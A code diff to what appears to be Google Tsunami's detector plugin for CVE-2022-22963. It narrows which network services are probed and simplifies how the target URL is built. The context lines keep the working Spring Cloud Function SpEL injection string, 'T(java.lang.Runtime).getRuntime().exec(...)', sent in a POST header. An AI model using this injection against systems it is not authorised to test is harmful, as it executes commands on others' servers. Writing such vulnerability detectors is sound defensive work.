@@ -17,7 +17,6 @@ package com.google.tsunami.plugins.detectors.cves.cve202222963;
 
 import static com.google.common.base.Preconditions.checkNotNull;
 import static com.google.common.collect.ImmutableList.toImmutableList;
-import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
 import static com.google.tsunami.common.net.http.HttpRequest.post;
 
 import com.google.common.annotations.VisibleForTesting;
@@ -82,20 +81,13 @@ public final class Cve202222963VulnDetector implements VulnDetector {
     this.payloadGenerator = checkNotNull(payloadGenerator);
   }
 
-  private static boolean isWebServiceOrUnknownService(NetworkService networkService) {
-    return networkService.getServiceName().isEmpty()
-        || NetworkServiceUtils.isWebService(networkService)
-        || NetworkServiceUtils.getServiceName(networkService).equals("unknown")
-        || NetworkServiceUtils.getServiceName(networkService).equals("rtsp");
-  }
-
   @Override
   public DetectionReportList detect(
       TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
     return DetectionReportList.newBuilder()
         .addAllDetectionReports(
             matchedServices.stream()
-                .filter(Cve202222963VulnDetector::isWebServiceOrUnknownService)
+                .filter(NetworkServiceUtils::isWebService)
                 .filter(this::isServiceVulnerable)
                 .map(networkService -> buildDetectionReport(targetInfo, networkService))
                 .collect(toImmutableList()))
@@ -117,7 +109,8 @@ public final class Cve202222963VulnDetector implements VulnDetector {
     }
     String commandToInject =
         String.format("T(java.lang.Runtime).getRuntime().exec(\"%s\")", payload.getPayload());
-    String targetUri = buildTargetUrl(networkService);
+    String targetUri =
+        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + CHECK_VUL_PATH;
     HttpRequest httpRequest =
         post(targetUri)
             .setHeaders(HttpHeaders.builder().addHeader(VULN_HEADER, commandToInject).build())
@@ -130,21 +123,6 @@ public final class Cve202222963VulnDetector implements VulnDetector {
       logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
     }
     return false;
-  }
-
-  private static String buildTargetUrl(NetworkService networkService) {
-    StringBuilder targetUrlBuilder = new StringBuilder();
-    if (NetworkServiceUtils.isWebService(networkService)) {
-      targetUrlBuilder.append(NetworkServiceUtils.buildWebApplicationRootUrl(networkService));
-    } else {
-      // Assume the service uses HTTP protocol when the scanner cannot identify the actual service.
-      targetUrlBuilder
-          .append("http://")
-          .append(toUriAuthority(networkService.getNetworkEndpoint()))
-          .append("/");
-    }
-    targetUrlBuilder.append(CHECK_VUL_PATH);
-    return targetUrlBuilder.toString();
   }
 
   private DetectionReport buildDetectionReport(
